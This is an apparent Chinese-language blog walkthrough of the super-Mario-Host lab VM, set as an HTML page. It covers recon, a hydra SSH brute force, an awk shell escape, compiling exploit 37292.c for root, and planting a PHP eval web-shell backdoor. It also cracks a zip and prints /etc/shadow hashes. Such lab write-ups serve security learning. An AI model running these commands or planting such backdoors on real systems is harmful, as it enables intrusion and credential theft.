@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+
+    
+
+    <title>
+      super-Mario-Host靶机渗透 | blogs 
+    </title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    
+      <meta name="author" content="ki..">
+    
+    
+
+    <meta name="description" content="靶机下载地址 提取码：a8ox 一、信息搜集1.搜索靶机与攻击机的IP地址12root@kali:~# arp-scan -lroot@kali:~# ifconfig 12靶机：192.168.189.145攻击机：192.168.189.129 2.nmap查看靶机开放端口1root@kali:~# nmap 192.168.189.145 为了更直观的查看端口对应的版本号信息，使用-sV1r">
+<meta property="og:type" content="article">
+<meta property="og:title" content="super-Mario-Host靶机渗透 | blogs">
+<meta property="og:url" content="https://zoeyeeeeeee.github.io/2019/10/18/super-Mario-Host靶机渗透/index.html">
+<meta property="og:site_name" content="blogs">
+<meta property="og:description" content="靶机下载地址 提取码：a8ox 一、信息搜集1.搜索靶机与攻击机的IP地址12root@kali:~# arp-scan -lroot@kali:~# ifconfig 12靶机：192.168.189.145攻击机：192.168.189.129 2.nmap查看靶机开放端口1root@kali:~# nmap 192.168.189.145 为了更直观的查看端口对应的版本号信息，使用-sV1r">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/super-Mario-Host靶机渗透/1-1.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/super-Mario-Host靶机渗透/1-1-2.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/super-Mario-Host靶机渗透/1-2.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/super-Mario-Host靶机渗透/1-2-2.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/super-Mario-Host靶机渗透/1-3.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/super-Mario-Host靶机渗透/2-1-1.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/super-Mario-Host靶机渗透/2-1-2.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/super-Mario-Host靶机渗透/2-2.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/super-Mario-Host靶机渗透/2-2-2.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/super-Mario-Host靶机渗透/2-3.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/super-Mario-Host靶机渗透/2-3-2.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/super-Mario-Host靶机渗透/2-4-1.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/super-Mario-Host靶机渗透/2-4-2.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/super-Mario-Host靶机渗透/2-5-1.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/super-Mario-Host靶机渗透/2-5-2.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/super-Mario-Host靶机渗透/2-6-1.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/super-Mario-Host靶机渗透/2-7-1.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/super-Mario-Host靶机渗透/2-7-2.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/super-Mario-Host靶机渗透/2-7-3.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/super-Mario-Host靶机渗透/2-7-4.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/super-Mario-Host靶机渗透/2-8-1.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/super-Mario-Host靶机渗透/2-8-2.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/super-Mario-Host靶机渗透/2-9-1.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/super-Mario-Host靶机渗透/2-10-1.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/super-Mario-Host靶机渗透/2-11-1.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/super-Mario-Host靶机渗透/2-11-2.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/super-Mario-Host靶机渗透/2-12-1.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/super-Mario-Host靶机渗透/3-1.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/super-Mario-Host靶机渗透/3-2.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/super-Mario-Host靶机渗透/3-3-1.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/super-Mario-Host靶机渗透/3-3-2.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/super-Mario-Host靶机渗透/3-4-1.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/super-Mario-Host靶机渗透/3-4-2.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/super-Mario-Host靶机渗透/3-5-1.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/super-Mario-Host靶机渗透/3-6-1.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/super-Mario-Host靶机渗透/3-7-1.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/super-Mario-Host靶机渗透/3-8-1.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/super-Mario-Host靶机渗透/3-8-2.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/super-Mario-Host靶机渗透/3-8-3.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/super-Mario-Host靶机渗透/3-9-1.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/super-Mario-Host靶机渗透/3-9-2.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/super-Mario-Host靶机渗透/3-10-1.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/super-Mario-Host靶机渗透/3-11-1.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/super-Mario-Host靶机渗透/3-11-2.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/super-Mario-Host靶机渗透/3-11-3.png">
+<meta property="og:updated_time" content="2019-10-18T10:56:03.603Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="super-Mario-Host靶机渗透 | blogs">
+<meta name="twitter:description" content="靶机下载地址 提取码：a8ox 一、信息搜集1.搜索靶机与攻击机的IP地址12root@kali:~# arp-scan -lroot@kali:~# ifconfig 12靶机：192.168.189.145攻击机：192.168.189.129 2.nmap查看靶机开放端口1root@kali:~# nmap 192.168.189.145 为了更直观的查看端口对应的版本号信息，使用-sV1r">
+<meta name="twitter:image" content="https://zoeyeeeeeee.github.io/2019/10/18/super-Mario-Host靶机渗透/1-1.png">
+    
+    
+    
+      <link rel="icon" type="image/x-icon" href="/favicon.png">
+    
+    <link rel="stylesheet" href="/css/uno.css">
+    <link rel="stylesheet" href="/css/highlight.css">
+    <link rel="stylesheet" href="/css/archive.css">
+    <link rel="stylesheet" href="/css/china-social-icon.css">
+
+</head>
+<body>
+
+    <span class="mobile btn-mobile-menu">
+        <i class="icon icon-list btn-mobile-menu__icon"></i>
+        <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+    
+
+<header class="panel-cover panel-cover--collapsed">
+
+
+  <div class="panel-main">
+
+  
+    <div class="panel-main__inner panel-inverted">
+    <div class="panel-main__content">
+
+        
+
+        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">blogs</a></h1>
+        <hr class="panel-cover__divider" />
+
+        
+
+        <div class="navigation-wrapper">
+
+          <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+
+              
+                
+                <li class="navigation__item"><a href="/#blog" title="" class="blog-button">首页</a></li>
+              
+                
+                <li class="navigation__item"><a href="/about" title="" class="">关于</a></li>
+              
+                
+                <li class="navigation__item"><a href="/archive" title="" class="">归档</a></li>
+              
+                
+                <li class="navigation__item"><a href="/links" title="" class="">友链</a></li>
+              
+
+            </ul>
+          </nav>
+
+          <!-- ----------------------------
+To add a new social icon simply duplicate one of the list items from below
+and change the class in the <i> tag to match the desired social network
+and then add your link to the <a>. Here is a full list of social network
+classes that you can use:
+
+    icon-social-500px
+    icon-social-behance
+    icon-social-delicious
+    icon-social-designer-news
+    icon-social-deviant-art
+    icon-social-digg
+    icon-social-dribbble
+    icon-social-facebook
+    icon-social-flickr
+    icon-social-forrst
+    icon-social-foursquare
+    icon-social-github
+    icon-social-google-plus
+    icon-social-hi5
+    icon-social-instagram
+    icon-social-lastfm
+    icon-social-linkedin
+    icon-social-medium
+    icon-social-myspace
+    icon-social-path
+    icon-social-pinterest
+    icon-social-rdio
+    icon-social-reddit
+    icon-social-skype
+    icon-social-spotify
+    icon-social-stack-overflow
+    icon-social-steam
+    icon-social-stumbleupon
+    icon-social-treehouse
+    icon-social-tumblr
+    icon-social-twitter
+    icon-social-vimeo
+    icon-social-xbox
+    icon-social-yelp
+    icon-social-youtube
+    icon-social-zerply
+    icon-mail
+
+-------------------------------->
+
+<!-- add social info here -->
+
+
+
+        </div>
+
+      </div>
+
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+
+    <div class="content-wrapper">
+        <div class="content-wrapper__inner entry">
+            
+
+<article class="post-container post-container--single">
+
+  <header class="post-header">
+    
+    <h1 class="post-title">super-Mario-Host靶机渗透</h1>
+
+    
+
+    <div class="post-meta">
+      <time datetime="2019-10-18" class="post-meta__date date">2019-10-18</time> 
+
+      <span class="post-meta__tags tags">
+
+          
+
+          
+
+      </span>
+    </div>
+    
+
+
+	 
+    
+
+  </header>
+
+  <section id="post-content" class="article-content post">
+    <p><a href="https://pan.baidu.com/s/13l1FUgJjXArfoTOfcmPsbA" target="_blank" rel="noopener">靶机下载地址</a> 提取码：a8ox</p>
+<h2 id="一、信息搜集"><a href="#一、信息搜集" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h2><h4 id="1-搜索靶机与攻击机的IP地址"><a href="#1-搜索靶机与攻击机的IP地址" class="headerlink" title="1.搜索靶机与攻击机的IP地址"></a>1.搜索靶机与攻击机的IP地址</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# arp-scan -l</span><br><span class="line">root@kali:~# ifconfig</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/10/18/super-Mario-Host靶机渗透/../super-Mario-Host靶机渗透/1-1.png" alt=""><br><img src="/2019/10/18/super-Mario-Host靶机渗透/../super-Mario-Host靶机渗透/1-1-2.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">靶机：192.168.189.145</span><br><span class="line">攻击机：192.168.189.129</span><br></pre></td></tr></table></figure></p>
+<h4 id="2-nmap查看靶机开放端口"><a href="#2-nmap查看靶机开放端口" class="headerlink" title="2.nmap查看靶机开放端口"></a>2.nmap查看靶机开放端口</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap 192.168.189.145</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/10/18/super-Mario-Host靶机渗透/../super-Mario-Host靶机渗透/1-2.png" alt=""><br>为了更直观的查看端口对应的版本号信息，使用-sV<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -sV 192.168.189.145</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2019/10/18/super-Mario-Host靶机渗透/../super-Mario-Host靶机渗透/1-2-2.png" alt=""></p>
+<h4 id="3-网站指纹信息扫描（whatweb"><a href="#3-网站指纹信息扫描（whatweb" class="headerlink" title="3.网站指纹信息扫描（whatweb)"></a>3.网站指纹信息扫描（whatweb)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# whatweb http://192.168.189.145:8180</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/10/18/super-Mario-Host靶机渗透/../super-Mario-Host靶机渗透/1-3.png" alt=""></p>
+<h2 id="二、web渗透"><a href="#二、web渗透" class="headerlink" title="二、web渗透"></a>二、web渗透</h2><h3 id="web端扫描"><a href="#web端扫描" class="headerlink" title="web端扫描"></a>web端扫描</h3><h4 id="1-发现开启22端口与8180web端口，尝试访问http-192-168-189-145-8180"><a href="#1-发现开启22端口与8180web端口，尝试访问http-192-168-189-145-8180" class="headerlink" title="1.发现开启22端口与8180web端口，尝试访问http://192.168.189.145:8180"></a>1.发现开启22端口与8180web端口，尝试访问<a href="http://192.168.189.145:8180" target="_blank" rel="noopener">http://192.168.189.145:8180</a></h4><p>下图为主页面与页面源代码，均没有任何的信息<br><img src="/2019/10/18/super-Mario-Host靶机渗透/../super-Mario-Host靶机渗透/2-1-1.png" alt=""><br><img src="/2019/10/18/super-Mario-Host靶机渗透/../super-Mario-Host靶机渗透/2-1-2.png" alt=""></p>
+<h4 id="2-通过目录扫描搜索真网站（dirb）"><a href="#2-通过目录扫描搜索真网站（dirb）" class="headerlink" title="2.通过目录扫描搜索真网站（dirb）"></a>2.通过目录扫描搜索真网站（dirb）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# cd /usr/share/dirb/wordlists/</span><br><span class="line">root@kali:/usr/share/dirb/wordlists/# dirb http://192.168.189.145:8180/ big.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/10/18/super-Mario-Host靶机渗透/../super-Mario-Host靶机渗透/2-2.png" alt=""><br><img src="/2019/10/18/super-Mario-Host靶机渗透/../super-Mario-Host靶机渗透/2-2-2.png" alt=""></p>
+<h4 id="3-查看到http-192-168-189-145-8180-vhosts-，网站的返回为200，查看网站登录内容"><a href="#3-查看到http-192-168-189-145-8180-vhosts-，网站的返回为200，查看网站登录内容" class="headerlink" title="3.查看到http://192.168.189.145:8180/vhosts ，网站的返回为200，查看网站登录内容"></a>3.查看到<a href="http://192.168.189.145:8180/vhosts" target="_blank" rel="noopener">http://192.168.189.145:8180/vhosts</a> ，网站的返回为200，查看网站登录内容</h4><p><img src="/2019/10/18/super-Mario-Host靶机渗透/../super-Mario-Host靶机渗透/2-3.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">靶机服务器名称（mario.supermariohost.local）</span><br><span class="line">服务器的管理员（webmaster@localhost）</span><br><span class="line">网站根路径（/var/www/supermariohost）</span><br><span class="line">目录索引（mario.php）</span><br><span class="line">若访问http://mario.supermariohost.local:8180，服务器将从/var/www/supermariohost目录中提供文件来服务mario.php</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2019/10/18/super-Mario-Host靶机渗透/../super-Mario-Host靶机渗透/2-3-2.png" alt=""></p>
+<h4 id="4-登录http-mario-supermariohost-local-8180"><a href="#4-登录http-mario-supermariohost-local-8180" class="headerlink" title="4.登录http://mario.supermariohost.local:8180"></a>4.登录<a href="http://mario.supermariohost.local:8180" target="_blank" rel="noopener">http://mario.supermariohost.local:8180</a></h4><p>登录显示如下图所示，找不到网站<br><img src="/2019/10/18/super-Mario-Host靶机渗透/../super-Mario-Host靶机渗透/2-4-1.png" alt=""><br><img src="/2019/10/18/super-Mario-Host靶机渗透/../super-Mario-Host靶机渗透/2-4-2.png" alt=""></p>
+<h4 id="5-修改hosts文件"><a href="#5-修改hosts文件" class="headerlink" title="5.修改hosts文件"></a>5.修改hosts文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\drivers\etc\hosts</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/10/18/super-Mario-Host靶机渗透/../super-Mario-Host靶机渗透/2-5-1.png" alt=""><br>继续访问<a href="http://mario.supermariohost.local:8180" target="_blank" rel="noopener">http://mario.supermariohost.local:8180</a> ，发现是一个游戏<br><img src="/2019/10/18/super-Mario-Host靶机渗透/../super-Mario-Host靶机渗透/2-5-2.png" alt=""></p>
+<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><h4 id="1-尝试爆破后台目录（御剑）"><a href="#1-尝试爆破后台目录（御剑）" class="headerlink" title="1.尝试爆破后台目录（御剑）"></a>1.尝试爆破后台目录（御剑）</h4><p><img src="/2019/10/18/super-Mario-Host靶机渗透/../super-Mario-Host靶机渗透/2-6-1.png" alt=""></p>
+<h4 id="2-访问-luigi-php-mario-php-command-php"><a href="#2-访问-luigi-php-mario-php-command-php" class="headerlink" title="2.访问/luigi.php(/mario.php)(/command.php)"></a>2.访问/luigi.php(/mario.php)(/command.php)</h4><p>发现luigi的一封信，其内容可用于创造字典（Luigi、luigi、Luiiiggiii、luiiiggiii）list.txt<br><img src="/2019/10/18/super-Mario-Host靶机渗透/../super-Mario-Host靶机渗透/2-7-1.png" alt=""><br>与网页首页相同，发现一段话，可用于创造字典（Mario、mario、Maaaaario）list.txt<br><img src="/2019/10/18/super-Mario-Host靶机渗透/../super-Mario-Host靶机渗透/2-7-2.png" alt=""><br>使用luigi发现存在此username<br><img src="/2019/10/18/super-Mario-Host靶机渗透/../super-Mario-Host靶机渗透/2-7-3.png" alt=""><br><img src="/2019/10/18/super-Mario-Host靶机渗透/../super-Mario-Host靶机渗透/2-7-4.png" alt=""></p>
+<h3 id="SSH爆破"><a href="#SSH爆破" class="headerlink" title="SSH爆破"></a>SSH爆破</h3><h4 id="1-直接创造文件生成字典（john）"><a href="#1-直接创造文件生成字典（john）" class="headerlink" title="1.直接创造文件生成字典（john）"></a>1.直接创造文件生成字典（john）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">leafpad list.txt</span><br><span class="line">cat list.txt</span><br></pre></td></tr></table></figure>
+<p>list.txt的内容如下图所示<br><img src="/2019/10/18/super-Mario-Host靶机渗透/../super-Mario-Host靶机渗透/2-8-1.png" alt=""><br>再用john在该list.txt的基础上生成相应社工密码进行爆破<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=list.txt --stdout --rules &gt; pass.txt</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2019/10/18/super-Mario-Host靶机渗透/../super-Mario-Host靶机渗透/2-8-2.png" alt=""></p>
+<h4 id="2-暴力破解（hydra）"><a href="#2-暴力破解（hydra）" class="headerlink" title="2.暴力破解（hydra）"></a>2.暴力破解（hydra）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L list.txt -P pass.txt ssh://192.168.189.145</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/10/18/super-Mario-Host靶机渗透/../super-Mario-Host靶机渗透/2-9-1.png" alt=""><br>报错的原因是因为没有安装ssh模块，但实际上是安装了，重新启动了一下ssh，发现可以成功爆破<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/ssh restart</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2019/10/18/super-Mario-Host靶机渗透/../super-Mario-Host靶机渗透/2-10-1.png" alt=""></p>
+<h4 id="3-使用ssh登录-luigi-luigi1"><a href="#3-使用ssh登录-luigi-luigi1" class="headerlink" title="3.使用ssh登录(luigi/luigi1)"></a>3.使用ssh登录(luigi/luigi1)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# ssh luigi@192.168.189.145</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/10/18/super-Mario-Host靶机渗透/../super-Mario-Host靶机渗透/2-11-1.png" alt=""><br><img src="/2019/10/18/super-Mario-Host靶机渗透/../super-Mario-Host靶机渗透/2-11-2.png" alt=""></p>
+<h4 id="4-登录成功后拿shell，但是限制了shell的交互"><a href="#4-登录成功后拿shell，但是限制了shell的交互" class="headerlink" title="4.登录成功后拿shell，但是限制了shell的交互"></a>4.登录成功后拿shell，但是限制了shell的交互</h4><p><img src="/2019/10/18/super-Mario-Host靶机渗透/../super-Mario-Host靶机渗透/2-12-1.png" alt=""></p>
+<h2 id="三、绕过提权"><a href="#三、绕过提权" class="headerlink" title="三、绕过提权"></a>三、绕过提权</h2><h4 id="1-查看所有命令"><a href="#1-查看所有命令" class="headerlink" title="1.查看所有命令(?)"></a>1.查看所有命令(?)</h4><p><img src="/2019/10/18/super-Mario-Host靶机渗透/../super-Mario-Host靶机渗透/3-1.png" alt=""></p>
+<h4 id="2-突破权限-awk"><a href="#2-突破权限-awk" class="headerlink" title="2.突破权限(awk)"></a>2.突破权限(awk)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &apos;BEGIN&#123;system(&quot;/bin/bash&quot;)&#125;&apos;</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/10/18/super-Mario-Host靶机渗透/../super-Mario-Host靶机渗透/3-2.png" alt=""></p>
+<h4 id="3-扫描服务器版本（searchsploit）"><a href="#3-扫描服务器版本（searchsploit）" class="headerlink" title="3.扫描服务器版本（searchsploit）"></a>3.扫描服务器版本（searchsploit）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# searchsploit 3.13</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/10/18/super-Mario-Host靶机渗透/../super-Mario-Host靶机渗透/3-3-1.png" alt=""><br><img src="/2019/10/18/super-Mario-Host靶机渗透/../super-Mario-Host靶机渗透/3-3-2.png" alt=""></p>
+<h4 id="4-获取提权文件（wget）"><a href="#4-获取提权文件（wget）" class="headerlink" title="4.获取提权文件（wget）"></a>4.获取提权文件（wget）</h4><p>注：一定要讲提权文件37292.c放在kali的/var/www/html中，Apache服务要开起来<br><img src="/2019/10/18/super-Mario-Host靶机渗透/../super-Mario-Host靶机渗透/3-4-1.png" alt=""><br><img src="/2019/10/18/super-Mario-Host靶机渗透/../super-Mario-Host靶机渗透/3-4-2.png" alt=""></p>
+<h4 id="5-执行提权文件，提权"><a href="#5-执行提权文件，提权" class="headerlink" title="5.执行提权文件，提权"></a>5.执行提权文件，提权</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">编译.c文件：gcc 37292.c -o exp</span><br><span class="line">执行文件：./exp</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/10/18/super-Mario-Host靶机渗透/../super-Mario-Host靶机渗透/3-5-1.png" alt=""></p>
+<h4 id="6-查看权限与当前路径"><a href="#6-查看权限与当前路径" class="headerlink" title="6.查看权限与当前路径"></a>6.查看权限与当前路径</h4><p><img src="/2019/10/18/super-Mario-Host靶机渗透/../super-Mario-Host靶机渗透/3-6-1.png" alt=""></p>
+<h4 id="7-留后门"><a href="#7-留后门" class="headerlink" title="7.留后门"></a>7.留后门</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &apos;&lt;?php @eval($_POST[cmd]);?&gt;&apos; &gt; index.php</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/10/18/super-Mario-Host靶机渗透/../super-Mario-Host靶机渗透/3-7-1.png" alt=""></p>
+<h4 id="8-用Python切shell"><a href="#8-用Python切shell" class="headerlink" title="8.用Python切shell"></a>8.用Python切shell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/10/18/super-Mario-Host靶机渗透/../super-Mario-Host靶机渗透/3-8-1.png" alt=""><br>进入root目录，发现存在一个flag.zip文件<br><img src="/2019/10/18/super-Mario-Host靶机渗透/../super-Mario-Host靶机渗透/3-8-2.png" alt=""><br>解压该zip文件，发现是一个有密码的文件<br><img src="/2019/10/18/super-Mario-Host靶机渗透/../super-Mario-Host靶机渗透/3-8-3.png" alt=""></p>
+<h4 id="9-wget到kali爆破"><a href="#9-wget到kali爆破" class="headerlink" title="9.wget到kali爆破"></a>9.wget到kali爆破</h4><p><img src="/2019/10/18/super-Mario-Host靶机渗透/../super-Mario-Host靶机渗透/3-9-1.png" alt=""><br><img src="/2019/10/18/super-Mario-Host靶机渗透/../super-Mario-Host靶机渗透/3-9-2.png" alt=""></p>
+<h4 id="10-爆破zip密码-fcrackzip"><a href="#10-爆破zip密码-fcrackzip" class="headerlink" title="10.爆破zip密码(fcrackzip)"></a>10.爆破zip密码(fcrackzip)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip -b -D -p rockyou.txt -u flag.zip</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/10/18/super-Mario-Host靶机渗透/../super-Mario-Host靶机渗透/3-10-1.png" alt=""></p>
+<h4 id="11-解压zip文件-unzip"><a href="#11-解压zip文件-unzip" class="headerlink" title="11.解压zip文件(unzip)"></a>11.解压zip文件(unzip)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip flag.zip</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/10/18/super-Mario-Host靶机渗透/../super-Mario-Host靶机渗透/3-11-1.png" alt=""><br>查看flag内容如下<br><img src="/2019/10/18/super-Mario-Host靶机渗透/../super-Mario-Host靶机渗透/3-11-2.png" alt=""><br>靶机作者的用意是要拿到靶机上所用用户的明文密码，在靶机中，查看 etc下的shadow<br><img src="/2019/10/18/super-Mario-Host靶机渗透/../super-Mario-Host靶机渗透/3-11-3.png" alt=""><br>存在的用户名如下所示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root:$6$ZmdseK46$FTvRqEZXdr3DCX2Vd6CXWmWAOJYIjcAI6XQathO3/wgvHEoyeP6DwL3NHZy903HXQ/F2uXiTXrhETX19/txbA1:17248:0:99999:7:::</span><br><span class="line">mario:$6$WG.vWiw8$OhoMhuAHSqPYTu1wCEWNc4xoUyX6U/TrLlK.xyhRKZB3SyCtxMDSoQ6vioNvpNOu78kQVTbwTcHPQMIDM2CSJ.:17248:0:99999:7:::</span><br><span class="line">luigi:$6$kAYr2OVy$1qBRKJIWqkpNohmMIP3r3H3yPDQ9UfUBcO4pahlXf6QfnqgW/XpKYlQD4jN6Cfn.3wKCWoM7gPbdIbnShFJD40:17233:0:99999:7:::</span><br></pre></td></tr></table></figure></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1、在发现web端没有线索的时候，爬取相应的信息作为ssh爆破的用户名<br>2、进入shell后发现shell被限制了，可以进行提权绕过<br>3、对靶机服务器版本进行扫描，有可能获取版本漏洞，从而加以利用</p>
+
+  </section>
+
+  <section class="post-comments">
+
+    <!-- 将评论系统（例如Disqus、多说、友言、畅言等）提供的代码片段粘贴在这里 -->
+    
+</section>
+
+
+</article>
+
+
+            <footer class="footer">
+
+    <span class="footer__copyright">&copy; 2014-2015. | 由<a href="https://hexo.io/">Hexo</a>强力驱动 | 主题<a href="https://github.com/someus/huno">Huno</a></span>
+    
+</footer>
+        </div>
+    </div>
+
+    <!-- js files -->
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/main.js"></script>
+    <script src="/js/scale.fix.js"></script>
+    
+
+    
+
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script type="text/javascript"> 
+        $(document).ready(function(){
+            MathJax.Hub.Config({ 
+                tex2jax: {inlineMath: [['[latex]','[/latex]'], ['\\(','\\)']]} 
+            });
+        });
+    </script>
+
+
+    
+
+    <script src="/js/awesome-toc.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $.awesome_toc({
+                overlay: true,
+                contentId: "post-content",
+            });
+        });
+    </script>
+
+
+    
+    
+    <!--kill ie6 -->
+<!--[if IE 6]>
+  <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
+<![endif]-->
+
+</body>
+</html>
